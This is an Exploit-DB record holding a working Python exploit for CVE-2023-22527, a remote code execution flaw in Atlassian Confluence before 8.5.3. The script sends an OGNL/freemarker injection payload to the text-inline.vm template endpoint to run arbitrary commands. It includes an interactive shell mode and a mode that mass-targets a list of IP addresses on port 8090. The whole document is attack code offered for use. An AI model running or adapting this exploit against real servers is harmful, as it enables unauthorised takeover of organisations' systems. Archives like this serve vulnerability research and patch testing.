{"source": "https://www.exploit-db.com/exploits/51904", "vulnName": "Atlassian Confluence < 8.5.3 - Remote Code Execution", "vulnEDBID": "51904", "vulnCVE": "N/A", "author": "MAANVADER", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2024-03-18", "vulnContent": "# Exploit Title: CVE-2023-22527: Atlassian Confluence RCE Vulnerability\n# Date: 25/1/2024\n# Exploit Author: MaanVader\n# Vendor Homepage: https://www.atlassian.com/software/confluence\n# Software Link: https://www.atlassian.com/software/confluence\n# Version:  8.0.x, 8.1.x, 8.2.x, 8.3.x, 8.4.x, 8.5.0-8.5.3\n# Tested on: 8.5.3\n# CVE : CVE-2023-22527\n\n\n\nimport requests\nimport argparse\nimport urllib3\nfrom prompt_toolkit import PromptSession\nfrom prompt_toolkit.formatted_text import HTML\nfrom rich.console import Console\n\n# Disable SSL warnings\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n# Argument parsing\nparser = argparse.ArgumentParser(description=\"Send a payload to Confluence servers.\")\nparser.add_argument(\"-u\", \"--url\", help=\"Single Confluence Server URL\")\nparser.add_argument(\"-f\", \"--file\", help=\"File containing list of IP addresses\")\nparser.add_argument(\"-c\", \"--command\", help=\"Command to Execute\")\nparser.add_argument(\"--shell\", action=\"store_true\", help=\"Open an interactive shell on the specified URL\")\nargs = parser.parse_args()\n\n# Rich console for formatted output\nconsole = Console()\n\n# Function to send payload\ndef send_payload(url, command):\n    headers = {\n        'Connection': 'close',\n        'Content-Type': 'application/x-www-form-urlencoded'\n    }\n    payload = ('label=\\\\u0027%2b#request\\\\u005b\\\\u0027.KEY_velocity.struts2.context\\\\u0027\\\\u005d.internalGet(\\\\u0027ognl\\\\u0027).findValue(#parameters.x,{})%2b\\\\u0027'\n                      '&x=@org.apache.struts2.ServletActionContext@getResponse().getWriter().write((new freemarker.template.utility.Execute()).exec({\"' + command + '\"}))\\r\\n')\n    headers['Content-Length'] = str(len(payload))\n    \n    full_url = f\"{url}/template/aui/text-inline.vm\"\n    response = requests.post(full_url, verify=False, headers=headers, data=payload, timeout=10, allow_redirects=False)\n    return response.text.split('<!DOCTYPE html>')[0].strip()\n\n# Interactive shell function\ndef interactive_shell(url):\n    session = PromptSession()\n    console.print(\"[bold yellow][!] Shell is ready, please type your commands UwU[/bold yellow]\")\n    while True:\n        try:\n            cmd = session.prompt(HTML(\"<ansired><b>$ </b></ansired>\"))\n            if cmd.lower() in [\"exit\", \"quit\"]:\n                break\n            response = send_payload(url, cmd)\n            console.print(response)\n        except KeyboardInterrupt:\n            break\n        except Exception as e:\n            console.print(f\"[bold red]Error: {e}[/bold red]\")\n            break\n\n# Process file function\ndef process_file(file_path):\n    with open(file_path, 'r') as file:\n        for line in file:\n            ip = line.strip()\n            url = f\"http://{ip}:8090\"\n            console.print(f\"Processing {url}\")\n            print(send_payload(url, args.command))\n\n# Main execution logic\nif args.shell and args.url:\n    interactive_shell(args.url)\nelif args.url and args.command:\n    print(send_payload(args.url, args.command))\nelif args.file and args.command:\n    process_file(args.file)\nelse:\n    print(\"Error: Please provide a valid URL and a command or use the interactive shell option.\")\n            "}